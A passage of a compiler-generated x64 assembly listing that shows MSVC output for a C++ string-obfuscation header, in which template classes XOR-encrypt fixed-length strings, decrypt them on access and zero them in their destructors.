	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN28@operator:
	mov	r9, 1978695492441415517			; 1b75bd1119a31f5dH
$LL27@operator:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 14
	jb	SHORT $LL27@operator

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+14], 0
$LN29@operator:

; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}

	mov	rax, r8
	ret	0
??B?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<14,1978695492441415517,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<14,1978695492441415517,char>::~obfuscated_data<14,1978695492441415517,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	DWORD PTR [rcx+8], eax
	mov	WORD PTR [rcx+12], ax

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<14,1978695492441415517,char>::~obfuscated_data<14,1978695492441415517,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@AEBV?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@AEBV?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@1@@Z PROC ; ay::obfuscated_data<14,1978695492441415517,char>::obfuscated_data<14,1978695492441415517,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+14], 1
	movzx	eax, BYTE PTR [rdx]
	mov	BYTE PTR [rcx], al
	movzx	eax, BYTE PTR [rdx+1]
	mov	BYTE PTR [rcx+1], al
	movzx	eax, BYTE PTR [rdx+2]
	mov	BYTE PTR [rcx+2], al
	movzx	eax, BYTE PTR [rdx+3]
	mov	BYTE PTR [rcx+3], al
	movzx	eax, BYTE PTR [rdx+4]
	mov	BYTE PTR [rcx+4], al
	movzx	eax, BYTE PTR [rdx+5]
	mov	BYTE PTR [rcx+5], al
	movzx	eax, BYTE PTR [rdx+6]
	mov	BYTE PTR [rcx+6], al
	movzx	eax, BYTE PTR [rdx+7]
	mov	BYTE PTR [rcx+7], al
	movzx	eax, BYTE PTR [rdx+8]
	mov	BYTE PTR [rcx+8], al
	movzx	eax, BYTE PTR [rdx+9]
	mov	BYTE PTR [rcx+9], al
	movzx	eax, BYTE PTR [rdx+10]
	mov	BYTE PTR [rcx+10], al
	movzx	eax, BYTE PTR [rdx+11]
	mov	BYTE PTR [rcx+11], al
	movzx	eax, BYTE PTR [rdx+12]
	mov	BYTE PTR [rcx+12], al
	movzx	eax, BYTE PTR [rdx+13]
	mov	BYTE PTR [rcx+13], al
	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@AEBV?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@1@@Z ENDP ; ay::obfuscated_data<14,1978695492441415517,char>::obfuscated_data<14,1978695492441415517,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
??B?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<21,6311572415330896177,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAXXZ ; ay::obfuscated_data<21,6311572415330896177,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<21,6311572415330896177,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<21,6311572415330896177,char>::~obfuscated_data<21,6311572415330896177,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	xorps	xmm0, xmm0
	movups	XMMWORD PTR [rcx], xmm0
	mov	DWORD PTR [rcx+16], eax
	mov	BYTE PTR [rcx+20], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<21,6311572415330896177,char>::~obfuscated_data<21,6311572415330896177,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@AEBV?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@AEBV?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@1@@Z PROC ; ay::obfuscated_data<21,6311572415330896177,char>::obfuscated_data<21,6311572415330896177,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	lea	rax, QWORD PTR [rdx+20]
	mov	BYTE PTR [rcx+21], 1
	lea	r8, QWORD PTR [rcx+20]
	cmp	rcx, rax
	ja	SHORT $LN10@obfuscated
	cmp	r8, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	r8, rcx
	sub	rdx, rcx
	mov	r9d, 21
	npad	14
$LL15@obfuscated:
	movzx	eax, BYTE PTR [rdx+r8]
	mov	BYTE PTR [r8], al
	lea	r8, QWORD PTR [r8+1]
	sub	r9, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, rcx
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	eax, DWORD PTR [rdx+16]
	movups	xmm0, XMMWORD PTR [rdx]
	movups	XMMWORD PTR [rcx], xmm0
	mov	DWORD PTR [rcx+16], eax
	movzx	eax, BYTE PTR [rdx+20]
	mov	BYTE PTR [rcx+20], al

; 124  : 			}
; 125  : 		}

	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@AEBV?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@1@@Z ENDP ; ay::obfuscated_data<21,6311572415330896177,char>::obfuscated_data<21,6311572415330896177,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
??B?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<15,140651103900218173,char>::operator char *, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+15], 0

; 139  : 		{

	mov	r8, rcx

; 147  : 			if ( m_encrypted )

	je	$LN29@operator

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN28@operator

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@01f3b16f0d3d333d01f3b16f0d3d333d
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN28@operator:
	mov	r9, 140651103900218173			; 01f3b16f0d3d333dH
$LL27@operator:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 15
	jb	SHORT $LL27@operator

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+15], 0
$LN29@operator:

; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}

	mov	rax, r8
	ret	0
??B?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<15,140651103900218173,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<15,140651103900218173,char>::~obfuscated_data<15,140651103900218173,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	DWORD PTR [rcx+8], eax
	mov	WORD PTR [rcx+12], ax
	mov	BYTE PTR [rcx+14], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<15,140651103900218173,char>::~obfuscated_data<15,140651103900218173,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@1@@Z PROC ; ay::obfuscated_data<15,140651103900218173,char>::obfuscated_data<15,140651103900218173,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+15], 1
	movzx	eax, BYTE PTR [rdx]
	mov	BYTE PTR [rcx], al
	movzx	eax, BYTE PTR [rdx+1]
	mov	BYTE PTR [rcx+1], al
	movzx	eax, BYTE PTR [rdx+2]
	mov	BYTE PTR [rcx+2], al
	movzx	eax, BYTE PTR [rdx+3]
	mov	BYTE PTR [rcx+3], al
	movzx	eax, BYTE PTR [rdx+4]
	mov	BYTE PTR [rcx+4], al
	movzx	eax, BYTE PTR [rdx+5]
	mov	BYTE PTR [rcx+5], al
	movzx	eax, BYTE PTR [rdx+6]
	mov	BYTE PTR [rcx+6], al
	movzx	eax, BYTE PTR [rdx+7]
	mov	BYTE PTR [rcx+7], al
	movzx	eax, BYTE PTR [rdx+8]
	mov	BYTE PTR [rcx+8], al
	movzx	eax, BYTE PTR [rdx+9]
	mov	BYTE PTR [rcx+9], al
	movzx	eax, BYTE PTR [rdx+10]
	mov	BYTE PTR [rcx+10], al
	movzx	eax, BYTE PTR [rdx+11]
	mov	BYTE PTR [rcx+11], al
	movzx	eax, BYTE PTR [rdx+12]
	mov	BYTE PTR [rcx+12], al
	movzx	eax, BYTE PTR [rdx+13]
	mov	BYTE PTR [rcx+13], al
	movzx	eax, BYTE PTR [rdx+14]
	mov	BYTE PTR [rcx+14], al
	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@1@@Z ENDP ; ay::obfuscated_data<15,140651103900218173,char>::obfuscated_data<15,140651103900218173,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
??B?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<13,9016711428731545553,char>::operator char *, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+13], 0

; 139  : 		{

	mov	r8, rcx

; 147  : 			if ( m_encrypted )

	je	$LN29@operator

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN28@operator

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@7d21cb4597bfa7d17d21cb4597bfa7d1
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN28@operator:
	mov	r9, 9016711428731545553			; 7d21cb4597bfa7d1H
$LL27@operator:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 13
	jb	SHORT $LL27@operator

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+13], 0
$LN29@operator:

; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}

	mov	rax, r8
	ret	0
??B?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<13,9016711428731545553,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<13,9016711428731545553,char>::~obfuscated_data<13,9016711428731545553,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	DWORD PTR [rcx+8], eax
	mov	BYTE PTR [rcx+12], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<13,9016711428731545553,char>::~obfuscated_data<13,9016711428731545553,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@1@@Z PROC ; ay::obfuscated_data<13,9016711428731545553,char>::obfuscated_data<13,9016711428731545553,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+13], 1
	movzx	eax, BYTE PTR [rdx]
	mov	BYTE PTR [rcx], al
	movzx	eax, BYTE PTR [rdx+1]
	mov	BYTE PTR [rcx+1], al
	movzx	eax, BYTE PTR [rdx+2]
	mov	BYTE PTR [rcx+2], al
	movzx	eax, BYTE PTR [rdx+3]
	mov	BYTE PTR [rcx+3], al
	movzx	eax, BYTE PTR [rdx+4]
	mov	BYTE PTR [rcx+4], al
	movzx	eax, BYTE PTR [rdx+5]
	mov	BYTE PTR [rcx+5], al
	movzx	eax, BYTE PTR [rdx+6]
	mov	BYTE PTR [rcx+6], al
	movzx	eax, BYTE PTR [rdx+7]
	mov	BYTE PTR [rcx+7], al
	movzx	eax, BYTE PTR [rdx+8]
	mov	BYTE PTR [rcx+8], al
	movzx	eax, BYTE PTR [rdx+9]
	mov	BYTE PTR [rcx+9], al
	movzx	eax, BYTE PTR [rdx+10]
	mov	BYTE PTR [rcx+10], al
	movzx	eax, BYTE PTR [rdx+11]
	mov	BYTE PTR [rcx+11], al
	movzx	eax, BYTE PTR [rdx+12]
	mov	BYTE PTR [rcx+12], al
	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@1@@Z ENDP ; ay::obfuscated_data<13,9016711428731545553,char>::obfuscated_data<13,9016711428731545553,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
